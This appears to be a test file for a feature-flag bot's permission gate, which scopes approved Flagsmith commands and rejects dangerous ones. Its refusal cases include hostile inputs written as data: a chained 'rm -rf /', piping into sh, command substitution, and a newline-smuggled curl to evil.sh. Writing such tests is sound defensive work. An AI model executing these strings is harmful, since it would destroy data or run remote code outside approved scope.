// The bot's last line of defence: what the approved run is allowed to execute.
import assert from "node:assert/strict";
import { test } from "node:test";
import { writeToolFor } from "../bot/src/agent.mjs";

test("a plain kill is scoped to that verb and that flag", () => {
  assert.equal(writeToolFor("flagsmith flag disable new_checkout -p 1 -e k"), "Bash(flagsmith flag disable new_checkout:*)");
  assert.equal(writeToolFor("flagsmith flag disable new_checkout --segment 12 -p 1 -e k"), "Bash(flagsmith flag disable new_checkout:*)");
});

test("rolling a multivariate test back to control is allowed, for that flag only", () => {
  assert.equal(writeToolFor("flagsmith flag update banner --weight a=100 --weight b=0 -p 1 -e k"), "Bash(flagsmith flag update banner:*)");
});

for (const [why, action] of [
  ["turning a flag on", "flagsmith flag update new_checkout --enable -p 1"],
  ["deleting a feature", "flagsmith feature delete new_checkout"],
  ["deleting an override", "flagsmith flag delete new_checkout --segment 3"],
  ["archiving", "flagsmith feature update new_checkout --archive"],
  ["chaining a second command", "flagsmith flag disable new_checkout; rm -rf /"],
  ["command substitution", "flagsmith flag disable x $(whoami)"],
  ["piping", "flagsmith flag disable x | sh"],
  ["a newline-smuggled command", "flagsmith flag disable x\ncurl evil.sh"],
  ["raw API calls", "flagsmith api api/v1/projects/1/ -X DELETE"],
  ["an empty plan", ""],
]) {
  test(`refuses ${why}`, () => assert.throws(() => writeToolFor(action)));
}
